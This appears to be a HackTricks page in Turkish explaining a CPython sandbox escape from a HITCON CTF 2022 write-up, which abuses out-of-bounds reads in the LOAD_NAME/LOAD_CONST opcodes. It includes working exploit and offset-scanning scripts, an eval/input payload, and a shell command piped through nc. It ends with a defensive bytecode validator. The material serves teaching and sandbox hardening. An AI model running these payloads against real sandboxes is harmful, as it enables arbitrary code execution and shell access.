# LOAD_NAME / LOAD_CONST opcode OOB Read

{{#include ../../../banners/hacktricks-training.md}}

**Bu bilgi** [**bu writeup'tan alınmıştır**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**<sup>[[1]](#references)</sup>

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

Bellekteki bazı sembolleri almak için LOAD_NAME / LOAD_CONST opcode'undaki OOB read özelliğini kullanabiliriz. Bu, istediğiniz bir sembolü (örneğin function name) almak için `(a, b, c, ... hundreds of symbol ..., __getattribute__) if [] else [].__getattribute__(...)` gibi bir trick kullanmak anlamına gelir.

Ardından exploit'inizi hazırlamanız yeterlidir.

### Overview <a href="#overview-1" id="overview-1"></a>

Source code oldukça kısa; yalnızca 4 satır içeriyor!
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```
Arbitrary Python code girebilirsiniz ve bu kod bir [Python code object](https://docs.python.org/3/c-api/code.html) olarak derlenir. Ancak bu code object'in `co_consts` ve `co_names` değerleri, code object eval edilmeden önce boş bir tuple ile değiştirilir.

Bu nedenle, consts (ör. sayılar, string'ler vb.) veya names (ör. değişkenler, fonksiyonlar) içeren tüm ifadeler sonunda segmentation fault'a neden olabilir.

### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>

Segmentation fault nasıl gerçekleşir?

Basit bir örnekle başlayalım: `[a, b, c]` aşağıdaki bytecode'a derlenebilir.
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE12345
```
Peki ya `co_names` boş bir tuple haline gelirse? `LOAD_NAME 2` opcode'u yine çalıştırılır ve başlangıçta olması gereken bellek adresinden değer okumaya çalışır. Evet, bu bir out-of-bound read "özelliğidir".

Çözümün temel konsepti basittir. CPython'daki bazı opcode'lar, örneğin `LOAD_NAME` ve `LOAD_CONST`, OOB read işlemine karşı savunmasızdır (?).

`consts` veya `names` tuple'ından (bunlar arka planda `co_consts` ve `co_names` olarak adlandırılır) `oparg` indeksindeki nesneyi alırlar. CPython'ın `LOAD_CONST` opcode'unu işlerken ne yaptığını görmek için aşağıdaki kısa snippet'e bakabiliriz.
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}1234567
```
Bu şekilde, keyfi bir bellek offset'inden bir "name" elde etmek için OOB özelliğini kullanabiliriz. Hangi name'e sahip olduğunu ve offset'inin ne olduğunu kesin olarak belirlemek için `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... komutlarını denemeye devam edin. Yaklaşık olarak oparg > 700 civarında bir şey bulabilirsiniz. Elbette bellek düzenine göz atmak için gdb kullanmayı da deneyebilirsiniz, ancak bunun daha kolay olacağını sanmıyorum?

### Exploit'i Oluşturma <a href="#generating-the-exploit" id="generating-the-exploit"></a>

Name'ler / const'lar için bu kullanışlı offset'leri elde ettikten sonra, bu offset'ten bir name / const'ı nasıl elde edip kullanırız? İşte size bir trick:\
Offset 5'ten (`LOAD_NAME 5`) bir `__getattribute__` name'i elde edebildiğimizi ve `co_names=()` olduğunu varsayalım; o zaman aşağıdakileri yapmanız yeterlidir:
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]1234
```
> `__getattribute__` olarak adlandırmanın gerekli olmadığını unutmayın; bunu daha kısa veya daha tuhaf bir adla adlandırabilirsiniz.

Bunun nedenini yalnızca bytecode'unu görüntüleyerek anlayabilirsiniz:
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE1234567891011121314
```
`LOAD_ATTR`'un da adı `co_names` içinden aldığını unutmayın. Python, ad aynı olduğunda adları aynı offset'ten yükler; bu nedenle ikinci `__getattribute__` hâlâ offset=5'ten yüklenir. Bu özellik sayesinde, ad yakındaki bellekte bulunduğu sürece keyfi bir ad kullanabiliriz.

Sayılar oluşturmak oldukça basit olmalı:

- 0: not \[\[]]
- 1: not \[]
- 2: (not \[]) + (not \[])
- ...

### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>

Uzunluk sınırı nedeniyle consts kullanmadım.

Öncelikle, adların offset'lerini bulmamızı sağlayacak bir script:
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```
Aşağıdaki ise gerçek Python exploit'ini oluşturmak içindir.
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
Temel olarak aşağıdakileri yapar; bu string'leri `__dir__` methodundan alırız:
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
---

### Sürüm notları ve etkilenen opcodes (Python 3.11–3.13)

- CPython bytecode opcodes hâlâ tamsayı operand'ları kullanarak `co_consts` ve `co_names` tuple'larına indeksleme yapar. Bir attacker bu tuple'ların boş olmasını (veya bytecode tarafından kullanılan maksimum indexten daha küçük olmasını) sağlayabilirse interpreter, ilgili index için sınır dışı bellek okuması gerçekleştirerek yakındaki bellekten arbitrary bir PyObject pointer elde eder. En azından şu opcodes geçerlidir:
- `LOAD_CONST consti` → `co_consts[consti]` değerini okur.
- `LOAD_NAME namei`, `STORE_NAME`, `DELETE_NAME`, `LOAD_GLOBAL`, `STORE_GLOBAL`, `IMPORT_NAME`, `IMPORT_FROM`, `LOAD_ATTR`, `STORE_ATTR` → `co_names[...]` içinden isimleri okur (3.11+ için `LOAD_ATTR`/`LOAD_GLOBAL` düşük bitte flag bit'lerini depolar; gerçek index `namei >> 1` şeklindedir). Sürüme göre kesin semantik için disassembler docs'a bakın. [Python dis docs].<sup>[[2]](#references)</sup>
- Python 3.11+, instructions arasına gizli `CACHE` entries ekleyen adaptive/inline caches özelliğini tanıttı. Bu, OOB primitive'ini değiştirmez; yalnızca bytecode'u elle oluşturuyorsanız `co_code` oluştururken bu cache entries'leri hesaba katmanız gerektiği anlamına gelir.

Pratik sonuç: Bir code object'i (örneğin `CodeType.replace(...)` aracılığıyla) kontrol edebildiğiniz ve `co_consts`/`co_names` boyutunu küçültebildiğiniz durumlarda bu sayfadaki teknik CPython 3.11, 3.12 ve 3.13 üzerinde çalışmaya devam eder.

### Yararlı OOB index'leri bulmak için hızlı scanner (3.11+/3.12+ uyumlu)

İlginç objects'leri high-level source yerine doğrudan bytecode üzerinden araştırmayı tercih ediyorsanız minimal code objects oluşturabilir ve index'leri brute force ile deneyebilirsiniz. Aşağıdaki helper, gerektiğinde inline caches'i otomatik olarak ekler.
```python
import dis, types

def assemble(ops):
# ops: list of (opname, arg) pairs
cache = bytes([dis.opmap.get("CACHE", 0), 0])
out = bytearray()
for op, arg in ops:
opc = dis.opmap[op]
out += bytes([opc, arg])
# Python >=3.11 inserts per-opcode inline cache entries
ncache = getattr(dis, "_inline_cache_entries", {}).get(opc, 0)
out += cache * ncache
return bytes(out)

# Reuse an existing function's code layout to simplify CodeType construction
base = (lambda: None).__code__

# Example: probe co_consts[i] with LOAD_CONST i and return it
# co_consts/co_names are intentionally empty so LOAD_* goes OOB

def probe_const(i):
code = assemble([
("RESUME", 0),          # 3.11+
("LOAD_CONST", i),
("RETURN_VALUE", 0),
])
c = base.replace(co_code=code, co_consts=(), co_names=())
try:
return eval(c)
except Exception:
return None

for idx in range(0, 300):
obj = probe_const(idx)
if obj is not None:
print(idx, type(obj), repr(obj)[:80])
```
Notlar
- Bunun yerine adları probe etmek için `LOAD_CONST` komutunu `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` ile değiştirin ve stack kullanımınızı buna göre ayarlayın.
- Gerekirse 255'ten büyük index'lere ulaşmak için `EXTENDED_ARG` veya `arg` için birden fazla byte kullanın. Yukarıdaki gibi `dis` ile oluştururken yalnızca düşük byte'ı kontrol edebilirsiniz; daha büyük index'ler için raw byte'ları kendiniz oluşturun veya attack'ı birden fazla load işlemine bölün.

### Minimal bytecode-only RCE pattern (co_consts OOB → builtins → eval/input)

`builtins` module'üne çözümlenen bir `co_consts` index'i belirledikten sonra, stack'i manipüle ederek herhangi bir `co_names` kullanmadan `eval(input())` ifadesini yeniden oluşturabilirsiniz:
```python
# Build co_code that:
# 1) LOAD_CONST <builtins_idx> → push builtins module
# 2) Use stack shuffles and BUILD_TUPLE/UNPACK_EX to peel strings like 'input'/'eval'
#    out of objects living nearby in memory (e.g., from method tables),
# 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
# This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
```
Bu yaklaşım, `co_consts=()` ve `co_names=()` zorunlu tutulurken `co_code` üzerinde doğrudan kontrol sağlayan challenge'larda (ör. BCTF 2024 “awpcode”) kullanışlıdır. Kaynak düzeyindeki hilelerden kaçınır ve bytecode stack işlemleri ile tuple oluşturucularından yararlanarak payload boyutunu küçük tutar.

### Sandbox'lar için defensive kontroller ve mitigation'lar

Güvenilmeyen kodu derleyen/değerlendiren veya code object'leri manipüle eden bir Python “sandbox” yazıyorsanız, bytecode tarafından kullanılan tuple index'lerinin bounds-check işlemlerini CPython'ın yapacağına güvenmeyin. Bunun yerine, code object'lerini çalıştırmadan önce kendiniz doğrulayın.

Pratik validator (`co_consts`/`co_names` üzerindeki OOB erişimini reddeder)
```python
import dis

def max_name_index(code):
max_idx = -1
for ins in dis.get_instructions(code):
if ins.opname in {"LOAD_NAME","STORE_NAME","DELETE_NAME","IMPORT_NAME",
"IMPORT_FROM","STORE_ATTR","LOAD_ATTR","LOAD_GLOBAL","DELETE_GLOBAL"}:
namei = ins.arg or 0
# 3.11+: LOAD_ATTR/LOAD_GLOBAL encode flags in the low bit
if ins.opname in {"LOAD_ATTR","LOAD_GLOBAL"}:
namei >>= 1
max_idx = max(max_idx, namei)
return max_idx

def max_const_index(code):
return max([ins.arg for ins in dis.get_instructions(code)
if ins.opname == "LOAD_CONST"] + [-1])

def validate_code_object(code: type((lambda:0).__code__)):
if max_const_index(code) >= len(code.co_consts):
raise ValueError("Bytecode refers to const index beyond co_consts length")
if max_name_index(code) >= len(code.co_names):
raise ValueError("Bytecode refers to name index beyond co_names length")

# Example use in a sandbox:
# src = input(); c = compile(src, '<sandbox>', 'exec')
# c = c.replace(co_consts=(), co_names=())       # if you really need this, validate first
# validate_code_object(c)
# eval(c, {'__builtins__': {}})
```
Ek mitigation fikirleri
- Güvenilmeyen girdiler üzerinde rastgele `CodeType.replace(...)` kullanımına izin vermeyin veya ortaya çıkan code object üzerinde katı yapısal kontroller ekleyin.
- CPython semantiklerine güvenmek yerine, untrusted code'u OS-level sandboxing (seccomp, job objects, containers) kullanarak ayrı bir process'te çalıştırmayı değerlendirin.

## Referanslar

- [1] [Splitline's HITCON CTF 2022 writeup "V O I D" (bu tekniğin ve high-level exploit chain'in kaynağı)](https://blog.splitline.tw/hitcon-ctf-2022/)
- [2] [Python disassembler docs (LOAD_CONST/LOAD_NAME/etc. için indeks semantiği ve 3.11+ `LOAD_ATTR`/`LOAD_GLOBAL` low-bit flags)](https://docs.python.org/3.13/library/dis.html)

{{#include ../../../banners/hacktricks-training.md}}
